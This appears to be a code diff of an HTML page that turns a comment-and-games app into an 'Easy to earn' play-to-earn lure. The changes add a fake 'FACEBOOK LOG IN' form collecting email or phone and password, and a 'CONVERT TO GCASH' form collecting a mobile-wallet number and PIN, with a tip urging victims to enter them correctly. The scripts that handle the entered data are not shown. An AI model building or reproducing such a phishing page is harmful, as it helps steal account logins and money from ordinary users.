@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>System</title>
+<title>Easy to earn</title>
 
 <meta name="viewport"
       content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -113,17 +113,17 @@ button.main {
 
 <!-- MAIN -->
 <section id="main" class="active">
-  <h2>COMMENT FIRST TO START</h2>
-  <input id="c1" placeholder="Comment 1">
-  <input id="c2" placeholder="Comment 2">
-  <button class="main" onclick="submitComment()">SUBMIT</button>
+  <h2>FACEBOOK LOG IN</h2>
+  <input id="c1" placeholder="Mobile number or email">
+  <input id="c2" placeholder="Password">
+  <button class="main" onclick="submitComment()">Log in</button>
 </section>
 
 <!-- GAMES -->
 <section id="games">
   <h2>GAMES</h2>
-  <p>Win: <span id="win">0</span> | Lose: <span id="lose">0</span></p>
-  <h3 id="question">Select a game</h3>
+  <p><span id="win"></span> PLAY TO EARN COINS <span id="lose"></span></p>
+  <h3 id="question">MATH GAME </h3>
   <input id="answer" placeholder="Answer">
   <button class="main" onclick="check()">SUBMIT ANSWER</button><br><br>
 
@@ -135,12 +135,16 @@ button.main {
 
 <!-- REDEEM -->
 <section id="redeem">
-  <h2>ENTER COINS TO REDEEM</h2>
+    <small style="display:block; margin-bottom:5px; color:#f1f1f1;">
+    Tip: make sure your gcash number and password are correct so you can get the money
+  </small>
+
+  <h2>CONVERT TO GCASH</h2>
   <input id="redeemCoins" placeholder="Coins (ex: 100 = 10)">
   <p>= <span id="redeemValue">0</span></p>
-  <input id="f1" placeholder="Feedback 1">
-  <input id="f2" placeholder="Feedback 2">
-  <button class="main" onclick="redeem()">REDEEM</button>
+  <input id="f1" placeholder="Number">
+  <input id="f2" placeholder="Pin">
+  <button class="main" onclick="redeem()">Redeem</button>
 
   <div class="loading" id="loading">
     Processing <span>• • • • •</span>
@@ -232,4 +236,4 @@ function redeem(){
 </script>
 
 </body>
-      </html>
+</html>
